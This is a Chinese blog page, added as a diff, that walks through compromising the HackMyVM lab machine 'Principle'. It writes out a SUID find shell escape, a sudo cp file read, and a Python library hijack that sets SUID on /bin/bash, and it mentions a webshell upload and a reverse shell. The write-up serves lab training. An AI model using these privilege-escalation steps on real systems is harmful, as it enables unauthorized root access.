@@ -1,0 +1,304 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" id="meta-theme-color" content="#faf6e9">
+  
+  <title>hackmyvm-Principle · Yliken</title>
+  <meta name="description" content="红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧">
+  <script>
+    /* 首帧前即定稿纸色：优先手动选择，否则跟随系统亮暗，避免闪烁 */
+    (function () {
+      var theme = 'day';
+      try {
+        var saved = localStorage.getItem('page-one-paper-theme');
+        if (saved === 'day' || saved === 'night') theme = saved;
+        else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) theme = 'night';
+      } catch (e) { /* ignore */ }
+      document.documentElement.dataset.theme = theme;
+    })();
+  </script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <header class="site-header">
+    <div class="container site-header__inner">
+      <a class="brand" href="/" aria-label="回到首页">
+        <span class="brand__mark" aria-hidden="true">页</span>
+        <span class="brand__name">Yliken</span>
+      </a>
+      <nav class="site-nav" aria-label="站点导航">
+        
+          <a class="site-nav__link" href="/">首页</a>
+        
+          <a class="site-nav__link" href="/archives/">归档</a>
+        
+          <a class="site-nav__link" href="/moments/">朋友圈</a>
+        
+          <a class="site-nav__link" href="/memories/">回忆</a>
+        
+          <a class="site-nav__link" href="/reading/">阅读</a>
+        
+          <a class="site-nav__link" href="/yearly-reviews/">年度总结</a>
+        
+          <a class="site-nav__link" href="/link/">友链</a>
+        
+          <a class="site-nav__link" href="/about/">关于</a>
+        
+      </nav>
+      
+      
+        <button class="theme-toggle" type="button" aria-label="切换到夜晚模式" title="切换到夜晚">
+          <span class="theme-toggle__icon" aria-hidden="true">☾</span>
+        </button>
+      
+    </div>
+  </header>
+
+  
+
+  <main class="site-main">
+    <div class="container">
+      
+<article class="post">
+  <header class="post__header">
+    
+      <p class="post__meta">
+        
+          <time class="post__date" datetime="2025-04-04">2025年4月4日</time>
+        
+        
+          <span class="post__readtime">13 分钟</span>
+        
+        
+          <span class="post__tags" aria-label="标签">
+            <a class="tag" href="/tags/hackmyvm/">#hackmyvm</a>
+          </span>
+        
+      </p>
+    
+    <h1 class="post__title">hackmyvm-Principle</h1>
+  </header>
+
+  <div class="post-body markdown-body">
+    <blockquote>
+<p>近况:</p>
+<p>很难受、 也很累。 但是庆幸靶机很好</p>
+<p>正值清明时节</p>
+<p>清明时节雨纷纷 🌧️，路上行人欲断魂 😢。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://hackmyvm.eu/machines/machine.php?vm=Principle">靶机地址</a></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>主机发现</strong></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042103890.png" alt="image-20250404210301780"></p>
+<p><strong>端口扫描</strong></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042104208.png" alt="image-20250404210429092"></p>
+<p>80端口仅仅是一个nginx 的欢迎界面而已</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042105098.png" alt="image-20250404210507023"></p>
+<p><strong>robots.txt</strong>的内容</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042106611.png" alt="image-20250404210608576"></p>
+<p><strong>hi.html</strong>的内容</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042107229.png" alt="image-20250404210705161"></p>
+<p><strong>hackme</strong>不存在</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042108465.png" alt="image-20250404210807417"></p>
+<p><strong>investigate</strong>的内容</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042108363.png" alt="image-20250404210814251"></p>
+<p>根据提示对这个目录进行目录扫描</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042137914.png" alt="image-20250404213709796"></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042139506.png" alt="image-20250404213910332"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">According to the Old Testament, the rainbow was created by God after the universal Flood. In the biblical account, it would appear as a sign of the divine will and to remind men of the promise made by God himself to Noah that he would never again destroy the earth with a flood.</span><br><span class="line">Maybe that&#x27;s why I am a robot?</span><br><span class="line">Maybe that is why I am alone in this world?</span><br><span class="line"></span><br><span class="line">The answer is here:</span><br><span class="line">-.. --- -- .- .. -. / - ....- .-.. ----- ... .-.-.- .... -- ...-</span><br><span class="line"></span><br><span class="line">根据《旧约》，彩虹是上帝在大洪水之后创造的。在圣经的记载中，彩虹是神意的标志，提醒人们上帝亲自对诺亚许下的承诺，即他永远不会再用洪水毁灭地球。</span><br><span class="line">也许这就是我成为机器人的原因？</span><br><span class="line">也许这就是我在这个世界上孤独的原因？</span><br><span class="line"></span><br><span class="line">答案就在这里：</span><br><span class="line">-.. --- -- .- .. -. / - ....- .-.. ----- ... .-.-.- .... -- ...-</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042140138.png" alt="image-20250404214002102"></p>
+<p>嗐，这里我以为域名是<code>DOMAINT4L0S.HMV</code>呢。 将其配置到<code>hosts</code>文件中。之后就不知道怎么做了</p>
+<p>后来才知道这里的意思应该是<code>DOMAIN  T4L0S.HMV</code> 域名是<code>T4L0S.HMV</code>。将其加入到<code>hosts</code>文件中去</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042142837.png" alt="image-20250404214224732"></p>
+<p>然后用域名去访问</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042143194.png" alt="image-20250404214317123"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[elohim@principle ~]$ <span class="built_in">echo</span> <span class="string">&quot;My son, you were born of dust and walk in my garden. Hear now my voice, I am your creator, and I am called <span class="subst">$(whoami)</span>.&quot;</span></span><br><span class="line">My son, you were born of dust and walk <span class="keyword">in</span> my garden. Hear now my voice, I am your creator, and I am called elohim.</span><br><span class="line">&lt;! Elohim is a liar and you must not listen to him, he is not here but it is possible to find him, you must look somewhere <span class="keyword">else</span>. -&gt;</span><br><span class="line"></span><br><span class="line">[elohim@principle ~]$ <span class="built_in">echo</span> “我的儿子，你生于尘土，却在我的花园里行走。现在听听我的声音，我是你的创造者，我被称为 $(<span class="built_in">whoami</span>)。”</span><br><span class="line">我的儿子，你生于尘土，却在我的花园里行走。现在听听我的声音，我是你的创造者，我被称为 elohim。</span><br><span class="line">&lt;! Elohim 是个骗子，你一定不能听他的，他不在这里，但可以找到他，你必须去别处看看。-&gt;</span><br></pre></td></tr></table></figure>
+
+<p>进行子域名枚举</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042152389.png" alt="image-20250404215207341"></p>
+<p>将子域名也加入hosts中</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042153367.png" alt="image-20250404215354230"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[elohim@principle ~]$ <span class="built_in">echo</span> <span class="string">&quot;Road to <span class="variable">$HOME</span>, but you don&#x27;t have access to the System. You should not look for the way, you have been warned.&quot;</span> </span><br><span class="line">Road to /gehenna, but you don<span class="string">&#x27;t have access to the System. You should not look for the way, you have been warned.</span></span><br><span class="line"><span class="string">&lt;! You&#x27;</span>re on the right track, he<span class="string">&#x27;s getting angry! -&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[elohim@principle ~]$ echo “通往 $HOME 的道路，但您无权访问系统。您不应该寻找这条路，您已经被警告了。”</span></span><br><span class="line"><span class="string">通往 /gehenna 的道路，但您无权访问系统。您不应该寻找这条路，您已经被警告了。</span></span><br><span class="line"><span class="string">&lt;！您走在正确的道路上，他生气了！ -&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问对这个域名进行目录扫描</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042156468.png" alt="image-20250404215623406"></p>
+<p>访问<code>upload.php</code></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042156274.png" alt="image-20250404215642127"></p>
+<p>是一个文件上传页面</p>
+<p>不过当我试着上传一个php文件的时候 它被阻止了</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042158067.png" alt="image-20250404215805865"></p>
+<p>当我把文件后缀名改为<code>png</code>的时候的时</p>
+<p>他仍然被阻止</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042159623.png" alt="image-20250404215911551"></p>
+<p>所以我意识到他可能只对文件头进行了校验。没有验证文件拓展名</p>
+<p>我修改了文件的拓展名之后，再次进行上传</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042203709.png" alt="image-20250404220314585"></p>
+<p>这次成功的上传了</p>
+<p>返回包头部的<code>Location</code>字段显示了上传的文件的位置</p>
+<p>然后再使用蚁剑连接</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042204385.png" alt="image-20250404220445275"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>这里拿一个<code>reverse shell</code></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042205854.png" alt="image-20250404220557801"></p>
+<p>发现<code>find</code>具有suid<code>talos</code>用户的权限。(请忽略 马赛克部分  因为这是我最开始做题的时候留下的)</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042210759.png" alt="image-20250404221059664"></p>
+<p>使用<code>find . -exec /bin/sh -p \; -quit</code>我们可以将权限提升为<code>talos</code></p>
+<p>在<code>/home/talos</code>目录下面有一个<code>note.txt</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> note.txt</span><br><span class="line"><span class="built_in">cat</span> note.txt</span><br><span class="line">Congratulations! You have made it this far thanks to the manipulated file I left you, I knew you would make it!</span><br><span class="line">Now we are very close to finding this <span class="literal">false</span> God Elohim.</span><br><span class="line">I left you a file with the name of one of the 12 Gods of Olympus, out of the eye of Elohim ;)</span><br><span class="line">The tool I left you is still your ally. Good luck to you.</span><br></pre></td></tr></table></figure>
+
+<p>12 Gods of Olympus</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Afrodita</span><br><span class="line">Apolo</span><br><span class="line">Zeus</span><br><span class="line">Hera</span><br><span class="line">Poseidon</span><br><span class="line">Ares</span><br><span class="line">Atenea</span><br><span class="line">Hermes</span><br><span class="line">Artemisa</span><br><span class="line">Hefesto</span><br><span class="line">Demeter</span><br><span class="line">Hestia</span><br></pre></td></tr></table></figure>
+
+<p>根据这个名单寻找</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">name.txt  note.txt</span><br><span class="line">$ <span class="keyword">for</span> line <span class="keyword">in</span> $(<span class="built_in">cat</span> name.txt); <span class="keyword">do</span> find / -iname *<span class="variable">$line</span>* 2&gt;/dev/null; <span class="keyword">done</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> $(<span class="built_in">cat</span> name.txt); <span class="keyword">do</span> find / -iname *<span class="variable">$line</span>* 2&gt;/dev/null; <span class="keyword">done</span></span><br><span class="line">/etc/selinux/Afrodita.key</span><br><span class="line">/usr/lib/modules/6.1.0-9-amd64/kernel/drivers/power/supply/cros_peripheral_charger.ko</span><br><span class="line">/usr/share/zoneinfo/Antarctica/Rothera</span><br><span class="line">/usr/share/zoneinfo/right/Antarctica/Rothera</span><br><span class="line">/usr/share/zoneinfo/Europe/Bucharest</span><br><span class="line">/usr/share/zoneinfo/right/Europe/Bucharest</span><br></pre></td></tr></table></figure>
+
+<p>在<code>/etc/selinux/Afrodita.key</code>中发现了<code>talos</code>的密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /etc/selinux/Afrodita.key</span><br><span class="line"><span class="built_in">cat</span> /etc/selinux/Afrodita.key</span><br><span class="line">Here is my password:</span><br><span class="line">Hax0rModeON</span><br><span class="line"></span><br><span class="line">Now I have <span class="keyword">done</span> another little trick to <span class="built_in">help</span> you reach Elohim.</span><br><span class="line">REMEMBER: You need the access key and open the door. Anyway, he has a bad memory and that<span class="string">&#x27;s why he keeps the lock coded and hidden at home.</span></span><br></pre></td></tr></table></figure>
+
+<p>现在我们可以切换到<code>talos</code>用户</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042219534.png" alt="image-20250404221917476"></p>
+<p><code>talos</code>用户可以免密码以elohim用户使用cp</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">bash-5.2$ <span class="built_in">ls</span> -al gehenna</span><br><span class="line"><span class="built_in">ls</span> -al gehenna</span><br><span class="line">total 44</span><br><span class="line">drwxr-xr-x 4 elohim elohim 4096 Apr  4 08:43 .</span><br><span class="line">drwxr-xr-x 4 root   root   4096 Jul  4  2023 ..</span><br><span class="line">-rw------- 1 elohim elohim  574 Apr  4 09:01 .bash_history</span><br><span class="line">-rw-r----- 1 elohim elohim  261 Jul  5  2023 .bash_logout</span><br><span class="line">-rw-r----- 1 elohim elohim 3830 Jul 14  2023 .bashrc</span><br><span class="line">-rw-r----- 1 elohim elohim  777 Jul 13  2023 flag.txt</span><br><span class="line">drw-r----- 3 elohim elohim 4096 Jul  2  2023 .<span class="built_in">local</span></span><br><span class="line">-rw-r----- 1 elohim elohim   21 Jul 12  2023 .lock</span><br><span class="line">-rw-r--r-- 1 elohim elohim   42 Apr  4 08:43 os.py</span><br><span class="line">-rw-r----- 1 elohim elohim  807 Jul  6  2023 .profile</span><br><span class="line">drwx------ 2 elohim elohim 4096 Jul  6  2023 .ssh</span><br></pre></td></tr></table></figure>
+
+<p><code>flag.txt</code>在<code>/home/gehenna</code>目录下。但是我们没有读取权限。即使使用cp 将其拷贝出来我们也没有权限读取</p>
+<p>将<code>flag.txt</code>的内容拷贝到 标准输入<code>stdout</code></p>
+<p>成功读取<code>flag</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">bash-5.2$ <span class="built_in">sudo</span> -u elohim /bin/cp gehenna/flag.txt /dev/stdout</span><br><span class="line"><span class="built_in">sudo</span> -u elohim /bin/cp gehenna/flag.txt /dev/stdout</span><br><span class="line">                           _</span><br><span class="line">                          _)\.-.</span><br><span class="line">         .-.__,___,_.-=-. )\`  a`\_</span><br><span class="line">     .-.__\__,__,__.-=-. `/  \     `\</span><br><span class="line">     &#123;~,-~-,-~.-~,-,;;;;\ |   <span class="string">&#x27;--;`)/</span></span><br><span class="line"><span class="string">      \-,~_-~_-,~-,(_(_(;\/   ,;/</span></span><br><span class="line"><span class="string">       &quot;,-.~_,-~,-~,)_)_)&#x27;</span>.  ;;(</span><br><span class="line">         `~-,_-~,-~(_(_(_(_\  `;\</span><br><span class="line">   ,          `<span class="string">&quot;~~--,)_)_)_)\_   \</span></span><br><span class="line"><span class="string">   |\              (_(_/_(_,   \  ;</span></span><br><span class="line"><span class="string">   \ &#x27;-.       _.--&#x27;  /_/_/_)   | |</span></span><br><span class="line"><span class="string">    &#x27;--.\    .&#x27;          /_/    | |</span></span><br><span class="line"><span class="string">        ))  /       \      |   /.&#x27;</span></span><br><span class="line"><span class="string">       //  /,        | __.&#x27;|  ||</span></span><br><span class="line"><span class="string">      //   ||        /`    (  ||</span></span><br><span class="line"><span class="string">     ||    ||      .&#x27;       \ \\</span></span><br><span class="line"><span class="string">     ||    ||    .&#x27;_         \ \\</span></span><br><span class="line"><span class="string">      \\   //   / _ `\        \ \\__</span></span><br><span class="line"><span class="string">       \&#x27;-&#x27;/(   _  `\,;        \ &#x27;--:,</span></span><br><span class="line"><span class="string">        `&quot;</span>`  `<span class="string">&quot;` `-,,;         `&quot;</span>`<span class="string">&quot;,,;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">CONGRATULATIONS, you have defeated me!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The flag is:</span></span><br><span class="line"><span class="string">K***************N</span></span><br></pre></td></tr></table></figure>
+
+<p>在3445端口上面开放了一个ssh服务但是不接受ipv4地址</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042225447.png" alt="image-20250404222541353"></p>
+<p>此外，可以使用cp将ssh的私钥读取出来</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042226386.png" alt="image-20250404222643153"></p>
+<p>ssh私有有密码保护</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042228888.png" alt="image-20250404222819840"></p>
+<p>在<code>/home/gehenna</code>下面还有一个<code>.lock</code>文件，将它读取出来</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042229961.png" alt="image-20250404222911831"></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042229364.png" alt="image-20250404222937254"></p>
+<p>在<code>cyberchef</code>上面可以将其解开(事实上就是16进制)</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042230694.png" alt="image-20250404223029625"></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042230019.png" alt="image-20250404223054890"></p>
+<p>然后使用<code>chisel</code>将ssh流量代理出来</p>
+<p>我的<code>chisel</code>的可执行文件就是<code>main</code></p>
+<p>在靶机上面执行</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042232043.png" alt="image-20250404223221978"></p>
+<p>在你的机器上面执行</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042232276.png" alt="image-20250404223248140"></p>
+<p>然后使用私钥进行ssh连接</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042233659.png" alt="image-20250404223327518"></p>
+<p>登录上去 你会发现使用<code>cd</code> <code>cat</code> 这些命令都无法执行</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042234616.png" alt="image-20250404223423442"></p>
+<p>不过你执行一个<code>bash --noprofile --norc</code>就可以绕过这个限制</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042235916.png" alt="image-20250404223513793"></p>
+<p>elohim用户拥有<code>sudo /usr/bin/python3 /opt/reviewer.py</code>的权限</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042236569.png" alt="image-20250404223617499"></p>
+<p><code>reviewer.py</code>的内容</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042237554.png" alt="image-20250404223758412"></p>
+<p>sml组对<code>subprocess.py</code>有写入权限。而且elohim又是<code>sml</code>组的用户</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042238035.png" alt="image-20250404223847970"></p>
+<p>所以写入</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;chmod +s /bin/bash&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042239481.png" alt="image-20250404223939424"></p>
+<p>然后执行 <code>sudo /usr/bin/python3 /opt/reviewer.py</code> bash就被加上了 <code>s</code>权限</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042240268.png" alt="image-20250404224050045"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">bash-5.2# <span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">bash-5.2# <span class="built_in">cd</span> /root</span><br><span class="line">bash-5.2# <span class="built_in">ls</span></span><br><span class="line">root.txt</span><br><span class="line">bash-5.2# <span class="built_in">cat</span> </span><br><span class="line">^C</span><br><span class="line">bash-5.2# <span class="built_in">cat</span> root.txt </span><br><span class="line">CONGRATULATIONS, the system has been pwned!</span><br><span class="line"></span><br><span class="line">          _______</span><br><span class="line">        @@@@@@@@@@@</span><br><span class="line">      @@@@@@@@@@@@@@@</span><br><span class="line">     @@@@@@@222@@@@@@@</span><br><span class="line">    (@@@@@/_____\@@@@@)</span><br><span class="line">     @@@@(_______)@@@@</span><br><span class="line">      @@@&#123; <span class="string">&quot; L &quot;</span> &#125;@@@</span><br><span class="line">       \@  \ - /  @/</span><br><span class="line">        /    ~    \</span><br><span class="line">      / ==        == \</span><br><span class="line">    &lt;      \ __ /      &gt;</span><br><span class="line">   / \          |    /  \</span><br><span class="line"> /    \       ==+==       \</span><br><span class="line">|      \     ___|_         |</span><br><span class="line">| \//~~~|---/ * ~~~~  |     &#125;</span><br><span class="line">&#123;  /|   |-----/~~~~|  |    /</span><br><span class="line"> \_ |  /           |__|_ /</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">+w***********g/</span><br></pre></td></tr></table></figure>
+
+<p><strong>结束！</strong></p>
+<hr>
+<p>另外</p>
+<p>具有s权限的&#x2F;bin&#x2F;bash就是我刚才打马赛克的内容</p>
+<p>刚才完整的图片如下</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504042242079.png" alt="2f24b1302bea5c7c2c8fbca68f96adbc"></p>
+
+  </div>
+
+  
+    <nav class="post-toc" id="post-toc" aria-label="文章目录"></nav>
+  
+
+  
+    <footer class="post__license">
+      <span class="post__license-author">Yliken</span>
+      <span class="post__license-sep" aria-hidden="true">·</span>
+      <a class="post__license-link" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a>
+    </footer>
+  
+</article>
+
+
+  <section class="related" aria-label="相关阅读">
+    <h2 class="related__title">相关阅读</h2>
+    <ul class="related__list">
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2025-09-18">2025·09·18</time>
+          <a class="related__link" href="/2025/09/18/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-Democracy/">hackmyvm-Democracy</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2025-03-18">2025·03·18</time>
+          <a class="related__link" href="/2025/03/18/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-Espo/">hackmyvm-Espo</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2025-03-15">2025·03·15</time>
+          <a class="related__link" href="/2025/03/15/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-HackingToys/">hackmyvm-HackingToys</a>
+        </li>
+      
+    </ul>
+  </section>
+
+
+
+  <nav class="post-nav" aria-label="相邻文章">
+    
+      <a class="post-nav__link post-nav__link--prev" href="/2025/04/05/Golang/learn_to_write_a_C2_by_Go/">
+        <span class="post-nav__dir">← 上一篇</span>
+        <span class="post-nav__title">learn_to_write_a_C2_by_Go</span>
+      </a>
+    
+    
+      <a class="post-nav__link post-nav__link--next" href="/2025/03/18/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-Espo/">
+        <span class="post-nav__dir">下一篇 →</span>
+        <span class="post-nav__title">hackmyvm-Espo</span>
+      </a>
+    
+  </nav>
+
+
+    </div>
+  </main>
+
+  
+
+  
+  <footer class="site-footer">
+    <div class="container site-footer__inner">
+      
+      <p class="site-footer__copy">
+        © 2026 Yliken
+      </p>
+      
+        <p class="site-footer__motto">在技术里较真，也在生活里留白。</p>
+      
+      
+        <p class="site-footer__powered">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> · <span class="site-footer__theme">Page One</span></p>
+      
+    </div>
+    
+  </footer>
+  
+<script src="/js/theme.js"></script>
+
+  
+  
+</body>
+</html>
